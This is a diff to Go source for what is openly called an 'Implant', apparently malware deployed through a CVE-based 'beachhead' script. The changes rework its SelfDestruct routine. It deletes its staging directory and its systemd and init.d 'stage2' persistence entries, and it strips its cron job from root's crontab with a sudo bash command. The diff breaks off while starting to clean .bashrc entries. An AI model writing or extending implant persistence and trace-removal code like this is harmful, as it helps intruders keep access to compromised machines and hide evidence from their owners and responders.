@@ -9,11 +9,10 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"time"
-
-	"github.com/go-co-op/gocron/v2"
 )
 
 /*
@@ -171,18 +170,21 @@ func (i *Implant) ExecuteTasks() {
 }
 
 func (i *Implant) SelfDestruct() {
+	stage_2_path := "/tmp/myapp"
 	os.RemoveAll("/tmp/myapp") // TODO: make sure all implant stuff will be in this dir
 
 	// undoing everything in beachhead.sh in CVE
-	stage_2_path := "/tmp/stage2.sh"
-	os.RemoveAll(stage_2_path)                         // remove dir where stage2 is saved
 	os.RemoveAll("/etc/systemd/system/stage2.service") // remove dir with system services
 	os.RemoveAll("/etc/init.d/stage2")
 
-	// TODO
 	// -> removing cron jobs
-	scheduler, _ := gocron.NewScheduler()
-	scheduler.RemoveByTags()
+	// "sudo crontab -u root -l | grep -v '/tmp/myapp'  | crontab -u root -"
+	cmd := exec.Command("bash", "-c", `sudo crontab -u root -l | grep -v '/tmp/myapp' | sudo crontab -u root -`)
+
+	_, err := cmd.CombinedOutput()
+	if err != nil {
+		panic(err)
+	}
 
 	// remove entries in .bashrc
 	bashrc := "~/.bashrc"
